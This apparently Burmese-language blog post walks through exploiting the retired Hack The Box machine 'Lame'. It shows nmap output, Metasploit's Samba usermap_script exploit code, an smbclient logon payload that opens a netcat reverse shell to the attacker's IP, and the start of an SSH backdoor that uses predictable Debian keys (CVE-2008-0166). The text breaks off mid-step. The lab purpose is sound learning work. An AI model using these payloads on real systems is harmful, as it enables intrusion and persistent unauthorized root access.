---
cover: >-
  https://images.unsplash.com/photo-1700308234428-c619d7408fbd?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHJhbmRvbXx8fHx8fHx8fDE3MDE5NDkxMzV8&ixlib=rb-4.0.3&q=85
coverY: 0
---

# ခုတ်မယ် ထစ်မယ် ပါးပါးလှီးမယ် OpenSSL

## စတင်ခြင်း

နည်းပညာပိုင်းဆိုင်ရာ လေ့လာတာပဲဖြစ်ဖြစ်၊ အလုပ်ခွင်ထဲမှာ အလုပ်လုပ်ရင်း system တွေ၊ router/firewall တွေကို setup up လုပ်တဲ့အခါပဲဖြစ်ဖြစ် စာရေးသူအတွက် အတွေးတခုအမြဲရှိတတ်ပါတယ်။ ကိုယ်စိတ်ကြိုက် configure လုပ်ပြီးတာနဲ့ လုံခြုံရေးအတွက်တကယ်ကို လုံလောက်ရဲ့လား၊ ကိုယ်မသိလိုက်ပဲနဲ့ အပြင်ကနေဝင်လို့ရတဲ့ ဝင်ပေါက်များရှိနေနိုင်လားဆိုပြီး အခါတိုင်းလိုလို စိတ်ပူတတ်ပါလေရဲ့။ ဒီလိုပဲ... ကိုယ့်ရဲ့ login တွေကို ဖန်တီးတဲ့အခါမှာ အရမ်းကိုရှုပ်ထွေးတဲ့ password တွေကို သေချာရွေးပြီး password manager တွေကို အသေအချာအသုံးပြုတတ်တဲ့ အလေ့အကျင့်တခုကို အရင်ကတည်း ရထားပါတယ်။ သိသလောက်တော့... နည်းပညာသမားတိုင်းမှာ အဲ့လိုမျိုးအလေ့အထ အယောက်တိုင်းရှိပုံမပေါ်ပါဘူး။ ဒါကြောင့်လည်း brown field environment တွေမှာ အလုပ်လုပ်ရတဲ့အခါ weak password တွေ၊ မလိုအပ်ပါပဲနဲ့ port forwarding လုပ်ထားတဲ့ setup တွေအများကြီးတွေ့ဖူးတယ်။ ဒါဟာ အလုပ်ခွင်ထဲမှာ အလုပ်လုပ်ရင်းတွေရတာတွေဖြစ်တဲ့အတွက်၊ အဲ့ဒီ router တွေ၊ firewall တွေ၊ system တွေက enterprise မှာသုံးဖို့အတွက် setup လုပ်ထားတာတွေကို ကြုံတွေ့ရတာပါ။ တခါတလေ... အဲ့လို setup လုပ်ပြီးတော့ထားခဲ့တဲ့ sysadmin တွေ၊ network admin တွေ အလုပ်ခွင်ထဲမှာဘယ်လိုများ လုပ်ကိုင်စားသောက်နေကြပါသလဲလို့တောင်တွေးမိတတ်ပါတယ်။ စာရေးသူ ကိုယ်တိုင်လည်း လုပ်ငန်းခွင်စဝင်ကာစမှာတော့ အဲ့လိုမျိုး setup တွေလုပ်ခဲ့ဖူးတာတော့ မငြင်းနိုင်ပေမယ့်၊ နေ့တိုင်းအလုပ်ခွင်မှာရော၊ အိမ်မှာပါ လေ့လာလေ့ကျင့်တာများလာပြီး တနေ့ထက်တနေ့ ပိုကောင်းလာအောင်၊ ပိုသိလာအောင်၊ ပိုအလုပ်ဖြစ်လာအောင် ပြောင်းလဲယူလာရပါတယ်။ အလုပ်တစ်ခုကို သေသေချာချာလုပ်ချင်တဲ့ လူတိုင်းလည်း အဲ့လိုပဲဖြစ်ကြမယ်ထင်ပါတယ်။

နောက်ပိုင်းမှာတော့ စာရေးသူကိုယ်တိုင်က အိမ်မှာပဲဖြစ်ဖြစ်၊ အလုပ်မှာပဲဖြစ်ဖြစ် system တွေကို setup လုပ်တဲ့အခါတိုင်း အမြဲတမ်း လုံခြုံရေးအသိတခုအမြဲကပ်တဲ့အကျင့်ဘယ်ကနေ ရမှန်းမသိရလာပါတော့တယ်။ ဖြစ်နိုင်တာတခါက လုပ်ငန်းခွင်အတွေ့အကြုံတွေများလာတာနဲ့အမျှ အခြားကိုယ့်ရဲ့ senior engineer တွေဘယ်လိုမျိုးလုပ်သလဲ၊ ဒါ့အပြင် သူတို့ဘယ်လိုမျိုးတွေးသလဲ ဆိုတဲ့အဆင့်ထိကို သတိထားပြီးတော့ လေ့လာတတ်တဲ့အတွက် အတတ်ပညာပါမက၊ အသိပညာပါ ပိုမိုလေ့လာခွင့်ရခဲ့တာတော့ အမှန်ပါ။ ကိုယ့်လုပ်ငန်းခွင်အတွက် အလုပ်ဖြစ်ရုံသာ ပညာရပ်တခုကိုတတ်မြောက်အောင် လေ့လာမယ်ဆိုရင်တော့ နည်းပညာသမားတစ်ယောက်အတွက် ဘောင်အရမ်းကိုကျဉ်းလွန်းပါတယ်။ ဥပမာ - ကိုယ်က network engineer မို့လို့ networking နဲ့ပတ်သတ်တဲ့ အကြောင်းအရာတွေပဲ လေ့လာမယ်၊ သိမယ် ဆိုရင်လည်း အလုပ်ဖြစ်ပါတယ်။ သို့သော်... နောက်တဆင့်ဆက်တက်ဖို့ပဲဖြစ်ဖြစ်၊ တမူထူးခြားအောင် အမျိုးမျိုးကောင်းမွန်အောင် တီထွင်ဆန်းသစ်ဖို့ပဲဖြစ်ဖြစ် စာရေးသူတို့ နည်းပညာသမားတွေအတွက်က အများကြီး သိဖို့လိုပါတယ်။ လေ့လာမူအပိုင်းမှာလည်း ရပ်ပစ်လို့မရတဲ့အတွက် နေ့စဉ်ဆိုသလို အသစ်အသစ်တွေကို ဖတ်မှတ်သင်ယူကြရပါတယ်။ နည်းပညာသမား တစ်ယောက်အနေနဲ့ လေ့လာမူကိုရပ်လိုက်တာနဲ့ old guard လို့ခေါ်တဲ့ ရှေရိုးစွဲသမားတစ်ယောက် ဖြစ်လာပါတော့တယ်။ ပြဿနာ အဲ့မှာစတော့တာပါပဲ။ DevOps တို့၊ Agile တို့၊ Lean တို့လိုမျိုး နည်းပညာအပိုင်းက cultural movement သမားတွေနဲ့ ထိပ်တိုက်တွေ့တဲ့အခါ တော်တော်လေးကို လုပ်ရကိုင်ရ ခက်လာနိုင်တာလည်း သဘာဝပါ။ နောက်ဆုံးတော့... စာရေးသူ တွေးမိတာတခုက team တစ်ခုလုံးကို mindset ကို စပြီးတော့ပြောင်းလဲပစ်ဖို့က အဓိကမလုပ်မဖြစ်လုပ်ရမယ့် လုပ်ငန်းတခုပါ။ Agile methodology တွေ၊ Lean workflow တွေ တခုတည်းနဲ့တော့ သိပ်ပြီးတော့အလုပ်မဖြစ်နိုင်ပါဘူး။ စာရေးသူအတွက်တော့... ရိုးရာ Level 1 Help Desk Support Tech ကနေ Sysadmin/Network Admin၊ အဲ့ကနေမှ System Engineer (MSP/DataCentre/Enterprise)၊ နောက်တခါ Network Engineer (ISP/WAN/Home Broadband)၊ ပြီးတော့ လူကငပျင်းမို့လို့ အခုတခါ Automation Engineer (IaC/System/Network) အဆင့်ဆင့် ဘဝကူးပြောင်းခဲ့ရပါတော့တယ်။ အခုထိလည်းဆက်ပြီးတော့ လေ့လာသင်ယူရတဲ့ လုပ်ငန်းစဉ်လည်း မရပ်တန့်နိုင်သေးတာတော့ အမှန်ပါ။

အခုတခါလည်း စာရေးသူအတွက် အလိုအလျှောက်ဖြစ်လာတဲ့ လေ့လာသင်ယူဖို့စိတ်ကူး အသစ်တခုအနေနဲ့ Offensive Security ကို မျက်စိကျနေမိပြန်ပါတယ်။ အဲ့ဒီစိတ်ကူးရဲ့ နောက်ကွယ်မှာတော့ အချက် ၃ချက်ကိုအခြေခံပြီး လေ့လာချင်စိတ်စတင်ဖြစ်လာတယ်လို့ မြင်မိပါတယ်။

* အခုနောက်ပိုင်း နိုင်ငံတကာသတင်းတွေမှာ cybersecurity နဲ့ပတ်သတ်ပြီးတော့ hack ခံရတဲ့သတင်းတွေ၊ data breach ဖြစ်တဲ့သတင်းတွေနဲ့ modern warfare မှာ cyber warfare ဟာမရှိမဖြစ်နေရာရလာတဲ့ သတင်းတွေနဲ့ နေ့တိုင်း တွေ့ရဖတ်ရတာများလာပါတယ်။ အရင်တုန်းက data breach တွေမဖြစ်ဘူးလို့ မဆိုလိုပါ။ အခုလောလောဆယ်မှာ မကြာခဏဆိုသလို သတင်းတွေတွေ့ရတာပါ။ နည်းပညာသမားတစ်ယောက် အနေနဲ့ အဲ့ဒီသတင်းတွေကို စိတ်ဝင်စားမိတာတော့အမှန်ပါ။
* Podcast တွေကိုနားထောင်တတ်လာတာ အချိန်အားဖြင့် ၃နှစ်ကျော်ကျော် ၄နှစ်လောက်ရှိတော့မယ်ထင်ပါတယ်။ စာရေးသူ အနေနဲ့ ရထားစီးတဲ့အချိန်၊ အိမ်မှာ အိမ်အလုပ်တွေလုပ်နေရတဲ့အချိန်နဲ့ လေ့ကျင့်ခန်းလုပ်တဲ့အချိန်တွေမှာ နည်းပညာဆိုင်ရာ podcast တွေကို အမြဲနားထောင်ဖြစ်ပါတယ်။ နယ်ပယ်မျိုးစုံက အကြောင်းအရာတွေကိုလည်း အသိမိတ်ဆွေတွေ အကြံပေးတဲ့အခါတိုင်းလည်း လိုက်နားထောင်ဖြစ်ပါတယ်။ အဲ့ဒီထဲမှာ Darknet Diaries ဆိုတဲ့ podcast တခုလည်းပါလာပါတော့တယ်။ Cybersecurity လို့ပြောတာနဲ့ Darknet Diaries ကိုမသိတဲ့လူမရှိသလောက်ပါပဲ။ စာရေးသူက story တွေကိုနားထောင်ရတာကြိုက်ပါတယ်။ Darknet Diaries ကတော့ technical အရမ်းမဖြစ်ပါဘူး။ သို့သော်... cybersecurity ထဲက story တွေအများကြီးကို စိတ်ဝင်စားအောင် တင်ပြတတ်လို့ တော်တော်လေးကို သဘောကျမိပါတယ်။ ကြိုက်လွန်းလို့ ပြန်နားတောင်ရတဲ့ episode တွေတော်တော်များပါတယ်။ များသောအားဖြင့် Offensive Security (OffSec) နဲ့ Pen Testing လိုမျိုး topic တွေကို သဘောကျပါတယ်။ အဲ့ဒီ story တွေထဲက characters တွေဘယ်လိုမျိုး technique တွေသုံးသလဲ၊ ဘယ်လိုမျိုးတွေးသလဲ ဆိုတာမျိုးကို စာရေးသူ အမြဲသိချင်စိတ်ဖြစ်ခဲ့မိပါတယ်။
* နောက်တခုက ကိုယ်တိုင်နည်းပညာသမားဖြစ်တဲ့အတွက်၊ system တွေကို setup လုပ်တဲအခါတိုင်း လုံခြုံရေးအတွက်အမြဲထည့်သွင်းစဉ်းစားရပါတယ်။ System တခုအတွက် အကောင်းဆုံး defence ကိုသိချင်ရင်၊ attacker တစ်ယောက်အနေနဲ့ အခြားတဘက်က မြင်ကြည့်တတ်ဖို့ရ အရေးကြီးပါတယ်။ OffSec ဟာ attacker တယောက်လိုမြင်တတ်အောင် သင်ပေးတဲ့ ဘာသာရပ်တခုလို့ စာရေးသူမြင်ပါတယ်။ အဲ့ဒီအတွက် စာရေးသူ OffSec ကိုမျက်စိကျမိပါတယ်။

## အဘယ့်ကြောင့် OpenSSL

Linux Sysadmin တစ်ယောက်အနေနဲ့ နေ့စဉ်အသုံးပြုရတဲ့ protocol တစ်ခုဟာ SSH ဖြစ်ပါတယ်။ SSH session တစ်ခုကို password နဲ့ authenticate လုပ်လို့ရတဲ့အပြင်၊ private/public keys pair နဲ့လည်း authenticate လုပ်လို့ရပါတယ်။ Cryptography အရ key authentication ကို password authentication ထက်ပိုပြီးတော့ strong ဖြစ်တယ်လို့ ယူဆရမှာပါ။ ကျယ်ကျယ်ပြန့်ပြန့် အသုံးပြုတဲ့ protocol မို့ဘယ်တုန်းကမှ သံသယမဖြစ်ဘူးပါဘူး။ သို့သော်... CVE-2008-0166 security vulnerability ကို ကိုယ်တိုင် ကိုယ်ကျ exploit လုပ်ကြည့်တော့မှ ကြက်သီးကြီးကြီးထမိပါတော့တယ်။ ဒီ article မှာလည်း အဲ့ဒီ CVE ကိုအခြေခံပြီးတော့ exploit လုပ်ပုံကို ဆွေးနွေးပြချင်ပါတယ်။

ပထမဆုံးအနေနဲ့ CVE ဆိုတာကို အကျဉ်းချုပ်ရှင်းပြလိုပါတယ်။ သူ့ရဲ့အရှည်က Common Vulnerabilities and Exposures ဖြစ်ပါတယ်။ Cybersecurity community ထဲက security researcher တွေဟာသူတို့ရှာတွေ့ထားတဲ့ vulnerabilities ကို လူတိုင်းသိအောင်၊ လေ့လာလို့ရအောင်လို့ publish လုပ်ပါတယ်။ ဥပမာ - CVE-2008-0166 ဆိုတဲ့ဟာမှာ 2008 ကခုနှစ်ဖြစ်ပြီးတော့၊ 0166 က အဲ့ဒီခုနှစ်အတွက် ရှာတွေ့တဲ့အမှတ်စဉ်ဖြစ်ပါတယ်။ System တွေကို patch လုပ်တဲ့အခါမှာလည်း ဘယ် patch ကတော့၊ ဘယ် CVE အတွက်ဆိုပြီးတော့ reference လုပ်တာတွေ့ဖူး မြင်ဖူးမယ်လို့ထင်ပါတယ်။ ဒါဆိုရင်တော့ရှင်းမယ်ထင်ပါတယ်။ CVE-2008-0166 အကြောင်းကို အသေးစိတ်လေ့လာချင်ရင်တော့ အောက်ကလင့်တွေကနေ တဆင့်သွားလောက်ဖတ်ရှုလို့ရပါတယ်။

* https://www.cve.org/CVERecord?id=CVE-2008-0166
* https://nvd.nist.gov/vuln/detail/cve-2008-0166
* https://github.com/g0tmi1k/debian-ssh

## ခုတ်ထစ်ခြင်းအနုပညာ

ဒီ CVE-2008-0166 ကို exploit လုပ်ဖို့အတွက်က တိုက်ရိုက်မဖြစ်နိုင်သော်လည်း system တစ်ခုထဲကို foothold ရပြီဆိုတာနဲ့ backdoor ထားခဲ့နိုင်အနေအထားတခုကို လက်တွေ့ပြချင်ပါတယ်။ အောက်မှာတော့ စာရေးသူ သုံးမယ့် target detail ကိုဖော်ပြပေးထားပါတယ်။

* **Platform**: Hack The Box (HTB)
* **Machine Name**: Lame
* **Machine Status**: Retired
* **Machine IP**: 10.10.10.3
* **OS**: Linux
* **Level**: Easy

### ရှေ့ပြေးကင်းထောက် (Reconnaissance - Recon)

အရင်ဆုံးအနေနဲ့ nmap ဆိုတဲ့ tool ကိုအသုံးပြုပြီးတော့ target အကြောင်းအနည်းငယ် လေ့လာကြည့်ရအောင်ဗျ။

```bash
nmap -vvv -Pn -sCV -p0-65535 --reason -oN lame.nmap 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.23s latency).
Scanned at 2023-11-01 07:02:56 EDT for 405s
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  @þ¯NV      syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 36056/tcp): CLEAN (Timeout)
|   Check 3 (port 40169/udp): CLEAN (Timeout)
|   Check 4 (port 26132/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h59m45s, deviation: 2h49m43s, median: -15s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-11-01T07:08:44-04:00

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  1 07:09:41 2023 -- 1 IP address (1 host up) scanned in 405.22 seconds
```

မြင်တွေ့တဲ့အတိုင်း အပေါက်တွေတော်တော်များ ပွင့်နေပါတယ်။ စာရေးသူတို့ Samba ကိုအသုံးပြု foothold ရအောင် စတင်လိုက်ရအောင်။ Searchsploit ကိုပဲသုံးပြီးဖြစ်ဖြစ်၊ Google မှာရှာရှာ target မှာ run ထားတဲ့ Samba version 3.0.20 ဟာ CVE-2007-2447 vulnerability ရှိနေပါတယ်။ Searchsploit မှာရှာတဲ့ပုံစံကို အောက်မှာပြထားပါတယ်။ CVE က 2007 လို့ပြောတဲ့အတွက် samba 2007 ဆိုပြီးတော့ရှာလိုက်တာပဲဖြစ်ပါတယ်။

```bash
searchsploit samba 2007
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote File Inclusions                                                                                            | php/webapps/4575.txt
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                      | osx/remote/16875.rb
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                          | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                        | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                    | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                  | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                                                  | linux/dos/4732.c
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) ဆိုတဲ့တခုကို ပိုပြီးတော့နားလည်အောင်လို့ သူနဲ့ပတ်သတ်တဲ့ Ruby script ကိုတချက်လောက်လေ့လာကြည့်ရအောင်။

```bash
searchsploit -x 16320
##
# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = ExcellentRanking

        include Msf::Exploit::Remote::SMB

        # For our customized version of session_setup_ntlmv1
        CONST = Rex::Proto::SMB::Constants
        CRYPT = Rex::Proto::SMB::Crypt

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Samba "username map script" Command Execution',
                        'Description'    => %q{
                                        This module exploits a command execution vulerability in Samba
                                versions 3.0.20 through 3.0.25rc3 when using the non-default
                                "username map script" configuration option. By specifying a username
                                containing shell meta characters, attackers can execute arbitrary
                                commands.

                                No authentication is needed to exploit this vulnerability since
                                this option is used to map usernames prior to authentication!
                        },
                        'Author'         => [ 'jduck' ],
                        'License'        => MSF_LICENSE,
                        'Version'        => '$Revision: 10040 $',
                        'References'     =>
                                [
                                        [ 'CVE', '2007-2447' ],
                                        [ 'OSVDB', '34700' ],
# More Ruby Code HERE.....
		def exploit # <===== EXPLOIT

                connect

                # lol?
                username = "/=`nohup " + payload.encoded + "`"
                begin
                        simple.client.negotiate(false)
                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
                rescue ::Timeout::Error, XCEPT::LoginError
                        # nothing, it either worked or it didn't ;)
                end

                handler
        end

end
```

def exploit ဆိုတဲ့ function ကိုကြည့်လိုက်ရင် username မှာ payload ကိုဘယ်လိုမျိုး pass လုပ်ပြီးတော့ exploit လုပ်လို့ရသလဲဆိုတာကိုပြထားပါတယ်။ ဒါဆိုရင်တော့ foothold ရဖို့အတွက် နောက်အဆင့် ပါးပါးလှီးဖို့ပဲကျန်ပါတော့တယ်။

### ပါးပါးလှီးခြင်း အနုပညာ (Exploit)

smbmap ဆိုတဲ့ tool ကိုအသုံးပြုပြီးတော့ target ရဲ့ Samba server ကိုတချက်လောက် အနံ့ခံကြည့်လိုက်ရအောင်ဗျ။

```bash
smbmap -H 10.10.10.3

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

tmp ဆိုတဲ့ Samba share မှာ permission ကိုမှားပြီးတော့ Read and Write ပေးထားတာကို အပေါ်မှာပြထားတဲ့အတိုင်းတွေ့ရမှာပါ။ ဒီတခါတော့ အမှန်တကယ်စတင်ပြီး ပါးပါးလှီးကြည့်လိုက်ရအောင်။

* စာရေးသူသုံးတဲ့ local machine မှာ netcat ကိုအသုံးပြီးတော့ reverse shell အတွက်ကြိုတင်ပြင်ဆင်ရပါ့မယ်။ အသုံးပြုရမယ့် command ကတော့ `nc -nvlp 443`. Netcat ကို port 443 ကနေပြီး inbound traffic ကို listen လုပ်ခိုင်းတဲ့ command ပါ၊။
* နောက်အဆင့်အနေနဲ့ smbclient ကိုအသုံးပြုပြီး target machine ရဲ့ tmp share ကို anonymous အနေနဲ့ login ဝင်ပါတယ်။
* ပြီးရင် `smb: \>` ဆိုတဲ့ prompt မှာ ``logon "/=`nohup nc -e /bin/sh 10.10.16.2 443`"`` payload ကို pass ပေးလိုက်ရုံပါပဲ။ ဒီနေရာမှာ 10.10.16.2 ဆိုတာက စာရေးသူရဲ့ local machine IP address ဖြစ်ပါတယ်။ `Password:` ဆိုတဲ့ prompt မှာ ဘာမှရိုက်ထည့်စရာမလိုပဲ Enter ခေါက်ပေးလိုက်ရုံနဲ့ reverse shell ကို ကိုယ့်ရဲ့ local machine မှာပွင့်လာမှာပဲဖြစ်ပါတယ်။
* Python ကို အသုံးပြီးတော့ shell ကို upgrade လုပ်ချင်ရင်တော့ `python -c 'import pty;pty.spawn("/bin/bash")'` command နဲ့လုပ်လိုက်ရုံပါပဲ။

````

```bash
# exploit samba in the first tmux session on the attacking machine
smbclient --no-pass //10.10.10.3/tmp
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/=`nohup nc -e /bin/sh 10.10.16.3 443`"
Password: 
session setup failed: NT_STATUS_IO_TIMEOUT
smb: \> 


#################################################################################


# in prior to the samaba exploit, listen to the incoming reverse shell with netcat on the tcp port 443
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 40320
id
uid=0(root) gid=0(root)
whoami
root

# upgrade shell to bash 
python -c 'import pty;pty.spawn("/bin/bash")'
root@lame:/#
````

မြင်ရတဲ့အတိုင်း target မှာ foothold ရသွားပါပြီ။ ထင်သာမြင်သာရှိအောင်လို့ အောက်မှာ screenshot တစ်ခုထည့်ပေးထားပါတယ်။

<figure><img src="../.gitbook/assets/Samba Exploit on Lame_2023-12-23_16-43.png" alt=""><figcaption></figcaption></figure>

### တံခါးသစ်ဖွင့်လစ်ခြင်း အနုပညာ (Backdoor)

နောက်ဆုံးအဆင့်အနေနဲ့ backdoor ကိုဘယ်လိုမျိုးထားခဲ့သလဲဆိုတာကို CVE-2008-0166 နဲ့ လက်တွေ့အသုံးပြချင်ပါတယ်။

Target machine မှာ root အနေနဲ့ foothold ရထားပြီးတဲ့အလျှောက် ကိုယ်ပြန်ပြီးတော့ ဒီ target ကိုပြန်ဝင်ချင်ရင် reverse shell နဲ့ခက်ခဲစွာ ပြန်ဝင်စရာမလိုအောင်လို့ SSH backdoor ထားခဲ့မှာပဲဖြစ်ပါတယ်။ CVE-2008-0166 အရဆိုရင် ၂၀၀၇ ခုနှစ်၊ ၂၀၀၈ ခုနှစ် ဝန်းကျင်တုန်းက Debian based Linux မှာသုံးတဲ့ OpenSSL ရဲ့ cryptography မှာ အားနည်းချက်ရှိပါတယ်။ Public/public keys generation process မှာ ထွက်လာတဲ့ keys တွေဟာ random ပါ။ သို့သော် အဲ့ဒီ CVE မှာပြောတာက public နဲ့ private keys combination ကို ခန့်မှန်းလို့ရနေပါလေရဲ့။ ဆိုလိုရင်းက SSH ရဲ့ public key ကိုရရုံနဲ့ private key ကို predict လုပ်လို့ရနိုင်ပါတယ်။ ခန့်မှန်းလို့ ရသမျှ public/private keys pairs တွေကို GitHub ရဲ့ ဒီလင့် https://github.com/g0tmi1k/debian-ssh.git ကနေရယူလို့ရပါတယ်။

Attacker ဘက်က target machine ရဲ့ public key ကိုသိပြီဆိုတာနဲ့ သူနဲ့ match ဖြစ်မယ့် private key ကိုအသုံးပြုပြီးတော့ SSH key authentication လုပ်လိုက်ရုံပါပဲ။ ဒီလိုနဲ့ SSH backdoor ထားခဲ့လို့ရနိုင်ပါတယ်။

```bash
# After gaining a foothold on the target machine as non-privilege user, check if you have a read perm on /root/.ssh/authorized_keys
ls -l /root/.ssh/
total 8
-rw-r--r-- 1 root root 405 2010-05-17 21:44 authorized_keys
-rw-r--r-- 1 root root 442 2012-05-20 14:21 known_hosts

# Now get the pubkey inside authorized_keys file
less /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable

# Download the git repo and extract the predictable rsa
sudo git clone https://github.com/g0tmi1k/debian-ssh.git
cd debian-ssh/common_keys
sudo tar jxf debian_ssh_rsa_2048_x86.tar.bz2
cd rsa

# grep the content of pubkey to match its private key in the rsa directory
